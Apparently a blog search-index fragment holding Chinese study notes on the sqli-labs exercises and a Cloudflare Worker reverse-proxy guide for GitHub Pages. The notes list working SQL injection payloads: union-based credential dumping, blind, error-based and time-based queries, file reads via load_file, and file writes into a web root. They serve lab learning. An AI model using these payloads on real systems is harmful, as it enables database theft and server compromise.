class=\"built_in\">varchar</span>(<span class=\"number\">100</span>);<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103204324144.png\" alt=\"image-20201103204324144\"></p>\n<p>查询flag</p>\n<p><img src=\"/2020/11/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20201103204407576.png\" alt=\"image-20201103204407576\"></p>\n","categories":["Pentest"],"tags":["SQL注入"]},{"title":"sqli-labs学习笔记","url":"http://blog.le31ei.top/2020/11/02/sqli-labs学习笔记/","content":"<h2 id=\"less-1-less4-基础注入\"><a href=\"#less-1-less4-基础注入\" class=\"headerlink\" title=\"less-1 ~ less4 基础注入\"></a>less-1 ~ less4 基础注入</h2><p>基础的注入，直接回显数据库查询内容，可用常规思路进行注入</p>\n<p>用到的注入语句如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查询列数</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=1%27+order+by+3--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 回显查询列对应的位置,union查询需要前半部分查出来为NULL才会显示后半段内容，所以id要为-1</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,2,3--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查库</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,group_concat(schema_name),3+from+information_schema.schemata--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查表</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=%27security%27--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查列</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=%27users%27--+</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查数据</span></span><br><span class=\"line\">http://192.168.100.51/sql/Less-1/?id=-1%27+union+select+1,group_concat(username,password),3+from+users+where+id=1--+</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<p>Less1 字符型注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.100.51&#x2F;sql&#x2F;Less-1&#x2F;?id&#x3D;-1%27+union+select+1,group_concat(username,password),3+from+users+where+id&#x3D;1--+</span><br></pre></td></tr></table></figure>\n\n<p>less2 数字型注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.100.51&#x2F;sql&#x2F;Less-2&#x2F;?id&#x3D;-1+union+select+1,group_concat(username,password),3+from+users+where+id&#x3D;1--+</span><br></pre></td></tr></table></figure>\n\n<p>Less3</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.100.51&#x2F;sql&#x2F;Less-3&#x2F;?id&#x3D;-1%27)+union+select+1,group_concat(username,password),3+from+users+where+id&#x3D;1--+</span><br></pre></td></tr></table></figure>\n\n<p>less4</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.100.51&#x2F;sql&#x2F;Less-4&#x2F;?id&#x3D;1%22)+and+1&#x3D;2+union+select+1,group_concat(username,password),3+from+users+where+id&#x3D;1--+</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"less5-less6-盲注\"><a href=\"#less5-less6-盲注\" class=\"headerlink\" title=\"less5~less6 盲注\"></a>less5~less6 盲注</h2><p>盲注常用到的函数：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> left(a,b)函数，取a的前b位</span></span><br><span class=\"line\">left(user(),1)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> substr从b位置开始，取a的前c位</span></span><br><span class=\"line\">substr(a,b,c)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ascii将字符转换为ascii码的形式</span></span><br><span class=\"line\">ascii(&#x27;a&#x27;)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> mid函数从b位置开始截取a字符的c位，与substr作用相同</span></span><br><span class=\"line\">mid(a,b,c)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ord函数同ascii函数一样，将字符转换为ascii码值</span></span><br><span class=\"line\">ord(&#x27;a&#x27;)</span><br><span class=\"line\"> </span><br><span class=\"line\">ascii(substr(select user(),1,1))=98</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"keyword\">if</span>判断语句：<span class=\"keyword\">if</span>(a,b,c)，如果a为真，返回b，否则返回c</span></span><br><span class=\"line\">if((user() regexp &#x27;^ro&#x27;), 0, 1)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"regexp正则注入\"><a href=\"#regexp正则注入\" class=\"headerlink\" title=\"regexp正则注入\"></a>regexp正则注入</h3><p>用法：</p>\n<p>匹配到结果返回true，否则返回false</p>\n<p><code>select user() regexp &#39;^ro&#39;</code>：匹配查询结果是root，结果正确的时候为真，否则为假</p>\n<p>注入语句：<code>select * from users where id=1 and 1=(user() regexp &#39;^ro&#39;)</code></p>\n<h3 id=\"like匹配注入\"><a href=\"#like匹配注入\" class=\"headerlink\" title=\"like匹配注入\"></a>like匹配注入</h3><p>用法：</p>\n<p>查询到结果返回true，否则返回false</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure>\n\n<p>注入语句：<br><code>select * from usres where id =1 and 1=(user() like &#39;ro%&#39;)</code></p>\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> floor报错</span></span><br><span class=\"line\">Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> xpath注入</span></span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select%20user()),0x7e))%20--+</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select%20@@version),0x7e),1)%20--+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">  bigint 溢出</span></span><br><span class=\"line\">union select (!(select * from (select user())x) - ~0),2,3- -+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">  double 数值类型超出范围</span></span><br><span class=\"line\">union select (exp(~(select * FROM(SELECT USER())))),2, 3--+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 数据重复性</span></span><br><span class=\"line\"><span class=\"meta\">union%</span><span class=\"bash\">20select%201,2,3%20from%20(select%20NAME_CONST(version(),1),%20NAME_CONST(version(),1))x%20--+</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"延时注入\"><a href=\"#延时注入\" class=\"headerlink\" title=\"延时注入\"></a>延时注入</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> sleep延时注入</span></span><br><span class=\"line\">If(ascii(substr(database(),1,1))=116,1,sleep(3))--+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> benchmark延时注入</span></span><br><span class=\"line\">If(ascii(substr(database(),1,1))=116,1,BENCHMARK(50000000,ENCODE(%27MSG%27,%27by%205%20seconds%27)))--+</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"less7-导出\"><a href=\"#less7-导出\" class=\"headerlink\" title=\"less7 导出\"></a>less7 导出</h2><h3 id=\"load-file-导出文件\"><a href=\"#load-file-导出文件\" class=\"headerlink\" title=\"load_file()导出文件\"></a>load_file()导出文件</h3><p>load_file(file_name)<br>**使用条件： **</p>\n<ol>\n<li>必须拥有权限，并且文件可读，可通过<code>and (select count(*) from mysql.user)&gt;0</code>，如果 返回正常，则有读写权限</li>\n<li>必须指定文件的绝对路径</li>\n<li>文件必须小于<code>max_allowed_packet</code></li>\n</ol>\n<p>常见用法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"keyword\">load_file</span>(<span class=\"built_in\">char</span>(<span class=\"number\">99</span>,<span class=\"number\">58</span>,<span class=\"number\">47</span>,<span class=\"number\">98</span>,<span class=\"number\">111</span>,<span class=\"number\">111</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">105</span>)) <span class=\"keyword\">Explain</span>:“<span class=\"built_in\">char</span>(<span class=\"number\">99</span>,<span class=\"number\">58</span>,<span class=\"number\">47</span>,<span class=\"number\">98</span>,<span class=\"number\">111</span>,<span class=\"number\">111</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">105</span>)”就是“c:/boot.ini”的 <span class=\"keyword\">ASCII</span> 代码</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"keyword\">load_file</span>(<span class=\"number\">0x633a2f626f6f742e696e69</span>) </span><br><span class=\"line\"><span class=\"keyword\">Explain</span>:“c:/boot.ini”的 <span class=\"number\">16</span> 进制是“<span class=\"number\">0x633a2f626f6f742e696e69</span>”</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"keyword\">load_file</span>(c:\\\\boot.ini) </span><br><span class=\"line\"><span class=\"keyword\">Explain</span>:路径里的/用 \\\\代替</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"select-into-outfile-写文件\"><a href=\"#select-into-outfile-写文件\" class=\"headerlink\" title=\"select into outfile 写文件\"></a>select into outfile 写文件</h3><ol>\n<li>直接写入文件<br><code>Select version() into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php”</code></li>\n<li>写入文件尾<br><code>Select version() Into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php” LINES TERMINATED BY 0x16进制文件</code></li>\n</ol>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p>1、《mysql注入天书》</p>\n","categories":["Pentest"],"tags":["SQL注入"]},{"title":"github page通过cloudflare worker提速","url":"http://blog.le31ei.top/2020/09/22/github-page通过cloudflare-worker提速/","content":"<p>使用github page搭建博客方面很多，基本不用维护，但国内的访问速度非常慢，加载资源时间太长。于是百度了以下，发现有多种解决方案，国内cdn需要域名备案，太麻烦，所以采用了cloudflare提供的worker方式。</p>\n<p>其原理很简单，就是可以手写代码在worker中运行。通过该方式可以将worker修改为反向代理，通过worker的加速节点去访问我们的域名，具体配置如下：</p>\n<h1 id=\"0x01-创建worker\"><a href=\"#0x01-创建worker\" class=\"headerlink\" title=\"0x01 创建worker\"></a>0x01 创建worker</h1><p>点击worker标签，进入worker设置页面，点击创建worker</p>\n<p><img src=\"/2020/09/22/github-page%E9%80%9A%E8%BF%87cloudflare-worker%E6%8F%90%E9%80%9F/image-20200922153741195.png\" alt=\"image-20200922153741195\"></p>\n<p><img src=\"/2020/09/22/github-page%E9%80%9A%E8%BF%87cloudflare-worker%E6%8F%90%E9%80%9F/image-20200922153755348.png\" alt=\"image-20200922153755348\"></p>\n<p>输入以下代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * static files (404.html, sw.js, conf.js)</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> ASSET_URL = <span class=\"string\">&#x27;https://le31ei.github.io&#x27;</span>  <span class=\"comment\">// 输入需要代理的url</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> JS_VER = <span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> MAX_RETRY = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** <span class=\"doctag\">@type <span class=\"type\">&#123;RequestInit&#125;</span> </span>*/</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> PREFLIGHT_INIT = &#123;</span><br><span class=\"line\">  status: <span class=\"number\">204</span>,</span><br><span class=\"line\">  headers: <span class=\"keyword\">new</span> Headers(&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;access-control-allow-origin&#x27;</span>: <span class=\"string\">&#x27;*&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;access-control-allow-methods&#x27;</span>: <span class=\"string\">&#x27;GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;access-control-max-age&#x27;</span>: <span class=\"string\">&#x27;1728000&#x27;</span>,</span><br><span class=\"line\">  &#125;),</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;any&#125;</span> <span class=\"variable\">body</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;number&#125;</span> <span class=\"variable\">status</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Object&lt;string, string&gt;&#125;</span> <span class=\"variable\">headers</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">makeRes</span>(<span class=\"params\">body, status = <span class=\"number\">200</span>, headers = &#123;&#125;</span>) </span>&#123;</span><br><span class=\"line\">  headers[<span class=\"string\">&#x27;--ver&#x27;</span>] = JS_VER</span><br><span class=\"line\">  headers[<span class=\"string\">&#x27;access-control-allow-origin&#x27;</span>] = <span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Response(body, &#123;status, headers&#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;string&#125;</span> </span>urlStr </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">newUrl</span>(<span class=\"params\">urlStr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> URL(urlStr)</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (err) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">addEventListener(<span class=\"string\">&#x27;fetch&#x27;</span>, <span class=\"function\"><span class=\"params\">e</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> ret = fetchHandler(e)</span><br><span class=\"line\">    .catch(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> makeRes(<span class=\"string\">&#x27;cfworker error:\\n&#x27;</span> + err.stack, <span class=\"number\">502</span>))</span><br><span class=\"line\">  e.respondWith(ret)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;FetchEvent&#125;</span> </span>e </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fetchHandler</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> req = e.request</span><br><span class=\"line\">  <span class=\"keyword\">const</span> urlStr = req.url</span><br><span class=\"line\">  <span class=\"keyword\">const</span> urlObj = <span class=\"keyword\">new</span> URL(urlStr)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> path = urlObj.href.substr(urlObj.origin.length)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (urlObj.protocol === <span class=\"string\">&#x27;http:&#x27;</span>) &#123;</span><br><span class=\"line\">    urlObj.protocol = <span class=\"string\">&#x27;https:&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"number\">301</span>, &#123;</span><br><span class=\"line\">      <span class=\"string\">&#x27;strict-transport-security&#x27;</span>: <span class=\"string\">&#x27;max-age=99999999; includeSubDomains; preload&#x27;</span>,</span><br><span class=\"line\">      <span class=\"string\">&#x27;location&#x27;</span>: urlObj.href,</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (path.startsWith(<span class=\"string\">&#x27;/http/&#x27;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> httpHandler(req, path.substr(<span class=\"number\">6</span>))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (path) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">case</span> <span class=\"string\">&#x27;/http&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;请更新 cfworker 到最新版本!&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">case</span> <span class=\"string\">&#x27;/ws&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;not support&#x27;</span>, <span class=\"number\">400</span>)</span><br><span class=\"line\">  <span 